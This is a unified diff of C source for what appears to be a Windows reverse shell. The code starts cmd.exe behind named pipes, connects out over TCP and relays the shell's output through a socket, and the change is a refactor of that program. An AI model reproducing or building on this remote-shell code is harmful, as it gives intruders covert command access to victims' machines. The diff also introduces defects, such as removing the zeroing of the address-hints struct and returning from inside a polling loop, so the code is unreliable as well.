@@ -19,7 +19,7 @@ Pipe pipe;
 char OUTPUT_text[4096];
 DWORD OUTPUT_size;
 
-static Pipe create_pipes()
+Pipe create_pipes()
 {
     long i;
     TCHAR PipeNameBuffer[MAX_PATH];
@@ -46,7 +46,7 @@ static Pipe create_pipes()
 SECURITY_ATTRIBUTES sa;
 STARTUPINFO si;
 PROCESS_INFORMATION pi;
-static const PTSTR pipe_init()
+PTSTR pipe_init()
 {
     PTSTR cmd = "c:\\Windows\\system32\\cmd.exe";
     pipe = malloc(1 * sizeof(PTSTR));
@@ -72,22 +72,13 @@ static const PTSTR pipe_init()
     return NULL;
 }
 
-int exit_with_child()
-{
-    DWORD ew;
-    if (GetExitCodeProcess(pi.hProcess, &ew) && ew != STILL_ACTIVE)
-    {
-        exit(ew);
-    }
-    return 0;
-}
-
 int frompipe(HANDLE in, HANDLE ou)
 {
     OVERLAPPED overlap = {0};
     DWORD numberofbyte;
     char buffer[4096];
     DWORD read = 0;
+    DWORD ew;
     for (;;)
     {
         Sleep(300);
@@ -96,23 +87,28 @@ int frompipe(HANDLE in, HANDLE ou)
             OUTPUT_size = numberofbyte;
             strncpy(OUTPUT_text, buffer, numberofbyte);
         }
-        exit_with_child();
+        if(GetExitCodeProcess(pi.hProcess, &ew) && ew != STILL_ACTIVE)
+        {
+            exit(ew);
+        }
         return numberofbyte;
     }
 }
 
-int init_socket(LPVOID lpParam)
+void init_socket(LPVOID lpParam)
 {
     WSADATA wsaData;
     SOCKET ConnectSocket = INVALID_SOCKET;
     struct addrinfo *result = NULL,
                     *ptr = NULL,
                     hints;
+    char buffer[1000];
     char recvbuf[DEFAULT_BUFLEN];
+    int sended = 0;
     int iResult;
     int recvbuflen = DEFAULT_BUFLEN;
+
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    ZeroMemory(&hints, sizeof(hints));
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
@@ -126,18 +122,14 @@ int init_socket(LPVOID lpParam)
         {
             closesocket(ConnectSocket);
             ConnectSocket = INVALID_SOCKET;
-            main();
+            //main();
         }
         break;
     }
     freeaddrinfo(result);
 
-    char buffer[1000], *init;
-    if (init = (char *)pipe_init()){
-        return printf(init);
-    }
+    pipe_init();
 
-    int sended = 0;
     for (;;)
     {
         Sleep(300);
